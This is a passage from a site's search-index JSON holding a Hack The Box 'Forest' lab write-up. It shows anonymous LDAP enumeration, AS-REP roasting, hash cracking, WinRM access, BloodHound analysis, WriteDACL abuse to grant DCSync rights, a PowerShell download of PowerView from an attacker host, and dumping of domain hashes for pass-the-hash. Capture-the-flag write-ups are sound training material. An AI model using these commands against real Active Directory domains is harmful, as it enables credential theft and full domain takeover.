Using Domain Controller at: 10.10.10.161\n[+] Getting defaultNamingContext from Root DSE\n[+]     Found: DC=htb,DC=local\n[+] Attempting bind\n[+]     ...success! Binded as:\n[+]      None\n[+] Performing custom lookup with filter: \"objectClass=*\"\n[+]     Found 312 results:\n\nDC=htb,DC=local\n\nCN=Users,DC=htb,DC=local\n\n&lt;&lt;SNIP&gt;&gt;\n\nOU=Service Accounts,DC=htb,DC=local\n\nCN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local\n\nOU=Security Groups,DC=htb,DC=local\n</code></pre>"},{"location":"htb/labs/easy/forest-retire/#foothold","title":"Foothold","text":"<p><code>GetNPUsers.py</code> from the Impacket suite is used to exploit users with the \"Do not require Kerberos pre-authentication\" setting enabled. This allows you to request Kerberos TGTs without providing the user's password, and then crack the resulting hash offline. Here's a breakdown of how to use it:  </p> <p>Understanding the Process</p> <p>AS-REP Roasting: - The core technique is known as AS-REP roasting.  - When a user has \"Do not require Kerberos pre-authentication\" set, the Kerberos Key Distribution Center (KDC) will issue a TGT without requiring pre-authentication. - This TGT contains a hash of the user's password, which can be extracted and cracked.  </p> <p>GetNPUsers.py:</p> <ul> <li>This Impacket script automates the process of requesting these TGTs and extracting the hashes.</li> </ul> <pre><code>\uf306 \uf015  ~ \u276f impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass                      took \uf252  13s at \uf017  11:15:15 PM\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Getting TGT for svc-alfresco\n$krb5asrep$23$svc-alfresco@HTB.LOCAL:7d83e190f6f4c0e18b9119825b780eee$1c7372e2d3e52457028f1b143d51a115d9face7d6250c144774087196e5bf8a67ddb28af68aaffcb2a3d21b8ef1b9c7acfeddf159a4be34d38e14ac468c391570576873f92b55ae089f4a877090f98506b432d17eedf70481deefec66d269c7fe5518d4a0d3c8d582487d27df660bd577f08cd856c4d7870a5efa488fce91bbe4099dce4cfc1919271dc151dc7e28f558c6b6c8696121989825c07d89ee30ebcc6136564e3b3932fa3a18e3df9571d9a83dc1a0cc1673ced70889cfbb00acc8dab8fd9d2f84e58a7326c9e38ad79499078c1e3f2f70ba4112b97be77594a5d08c9ca333bdad6\n</code></pre>"},{"location":"htb/labs/easy/forest-retire/#cracking-the-hash","title":"Cracking the Hash","text":"<p>The hash obtained from the previous step can be cracked using a tool like Hashcat or John the Ripper. Here's how to do it with John the Ripper: </p><pre><code> ~ \u276f john john.hash --fork=4 -w=/usr/share/wordlists/rockyou.txt                                       took \uf252  6s at \uf017  11:27:25 PM\nUsing default input encoding: UTF-8\nLoaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])\nNode numbers 1-4 of 4 (fork)\nPress 'q' or Ctrl-C to abort, almost any other key for status\ns3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)\n4 1g 0:00:00:03 DONE (2025-03-17 23:27) 0.2958g/s 302196p/s 302196c/s 302196C/s s3urkf2m..s3rvice\n3 0g 0:00:00:10 DONE (2025-03-17 23:27) 0g/s 329893p/s 329893c/s 329893C/sa6_123\n1 0g 0:00:00:10 DONE (2025-03-17 23:27) 0g/s 328985p/s 328985c/s 328985C/s    qaz.ie168\nWaiting for 3 children to terminate\n2 0g 0:00:00:10 DONE (2025-03-17 23:27) 0g/s 328683p/s 328683c/s 328683C/s   tania.abygurl69\nSession completed.\n</code></pre> The cracked password is <code>s3rvice</code>.<p></p> <p>Using <code>Netexec</code> I was able to discover that the credentials can be able to use <code>winrm</code> to gain an interactive shell. </p><pre><code>netexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice                                             took \uf252  4s at \uf017  12:26:29 PM\nWINRM       10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)\nWINRM       10.10.10.161    5985   FOREST           [+] htb.local\\svc-alfresco:s3rvice (Pwn3d!)\n</code></pre><p></p>"},{"location":"htb/labs/easy/forest-retire/#privilege-escalation","title":"Privilege Escalation","text":"<p>Using BlooodHound, BloodHound itself is primarily a graphical tool, but the data it uses is collected through command-line tools. Here's a breakdown of the process:</p> <p>BloodHound relies on data collectors (ingestors) to gather information from Active Directory. The most common ingestor is SharpHound. </p><pre><code>~/Tools/BloodHound.py on \uf113  \uf126 master \u276f ./bloodhound.py -d htb.local -u svc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.1\n0.10.161\nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: htb.local\nINFO: Getting TGT for user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (FOREST.htb.local:88)] [Errno -2] Name or service not known\nINFO: Connecting to LDAP server: FOREST.htb.local\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 2 computers\nINFO: Connecting to LDAP server: FOREST.htb.local\nINFO: Found 32 users\nINFO: Found 76 groups\nINFO: Found 2 gpos\nINFO: Found 15 ous\nINFO: Found 20 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: EXCH01.htb.local\nINFO: Querying computer: FOREST.htb.local\nINFO: Done in 00M 31S\n</code></pre><p></p> <p>The data collected by SharpHound is then imported into the BloodHound GUI for analysis. You can use various queries to identify potential privilege escalation paths, such as finding users with high privileges, identifying misconfigurations, or discovering sensitive group memberships.</p> <p>Import all the <code>.json</code> file to Bloodhound Go to the <code>Analysis</code> Tab and click <code>Shortest Paths to High Value Targets</code></p> <p></p> <p>We can see that the <code>EXCHANGE WINDOWS PERMISSIONS</code> Group has <code>WriteDacl</code> to the htb.local</p> <p>According to <code>Microsoft documentation</code>, the Active Directory group that grants limited account creation privileges, including the ability to create and modify most types of accounts, is:</p>"},{"location":"htb/labs/easy/forest-retire/#account-operators","title":"Account Operators","text":"<p>Here's a breakdown:</p> <ul> <li> <p>The Account Operators group allows its members to create and modify user accounts, local groups, and global groups.   </p> </li> <li> <p>However, it's important to note that this group has limitations. It cannot manage certain highly privileged accounts and groups, such as the Administrator account or the Domain Admins group.  </p> </li> </ul> <p>Therefore, while the Domain Admins group has full control over all aspects of Active Directory, the Account Operators group is the one specifically designated for the task of creating and modifying most standard accounts.</p>"},{"location":"htb/labs/easy/forest-retire/#dcsync","title":"DCSync","text":"<p>A user with WriteDACL permissions on the domain root has a very powerful privilege, essentially granting them the ability to take full control of the entire Active Directory domain. Here's a breakdown of the attacks you can perform:</p>"},{"location":"htb/labs/easy/forest-retire/#understanding-writedacl","title":"Understanding WriteDACL","text":"<ul> <li> <p>WriteDACL allows a user to modify the Discretionary Access Control List (DACL) of an object. The DACL defines who has what permissions on the object.</p> </li> <li> <p>On the domain root, this means you can change the permissions of any object in the domain, including highly privileged groups.</p> </li> </ul>"},{"location":"htb/labs/easy/forest-retire/#attack-vectors","title":"Attack Vectors","text":"<ul> <li>Adding Yourself to Domain Admins:</li> <li>The most direct and devastating attack.</li> <li>You can modify the DACL of the Domain Admins group to add your own user account.   </li> </ul> <p>This grants you full administrative control over the domain.   </p> <p></p> <p>The above commands created a new user <code>Bob</code> and added it to the <code>Exchange Windows Permissions</code> groups</p> <p>Imported the <code>PowerView</code> module </p><pre><code>powershell.exe -Command \"(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.8:8000/PowerView.ps1', 'C:\\Users\\svc-alfresco\\Documents\\PowerView.ps1')\"\n</code></pre><p></p> <p>After inporting <code>PowerView.ps1</code> Run the below commands to add the New users Object and Password and get him <code>DCSync</code> right</p> <p></p><pre><code>*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; $pass = convertto-securestring 'Password123' -asplain -force\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; $cred = new-object system.management.automation.pscredential('htb\\Bob', $pass)\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; Add-ObjectACL -PrincipalIdentity Bob -Credential $cred -Rights DCSync\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt;\n</code></pre> Now we can now run <code>SecretDump</code> to dump all the Domain Credentials<p></p> <p></p> <p>Lets crack the <code>Administrator</code> password hash </p><pre><code>htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::\n</code></pre> **Understanding the Hash Format<p></p> <ul> <li><code>htb.local\\Administrator:</code> This is the username and domain.</li> <li><code>500:</code> This is the user ID (RID).</li> <li><code>aad3b435b51404eeaad3b435b51404ee:</code> This is the LM hash (which is usually useless nowadays).</li> <li><code>32693b11e6aa90eb43d32c72a07ceea6:</code> This is the NTLM hash, which is what we need to crack.</li> </ul> <p>Another Option is to run <code>impacket-psexec</code> and use the hash of the administrator and get an interactive shell</p> <p></p> <p>Now we have full control of the machine, we can read the user.txt and root.txt file</p> <p><code>Happy Hacking!</code></p>"},{"location":"blog/archive/2025/","title":"2025","text":""},{"location":"blog/archive/2025/#2025","title":"2025","text":""},{"location":"blog/archive/2024/","title":"2024","text":""},{"location":"blog/archive/2024/#2024","title":"2024","text":""}]}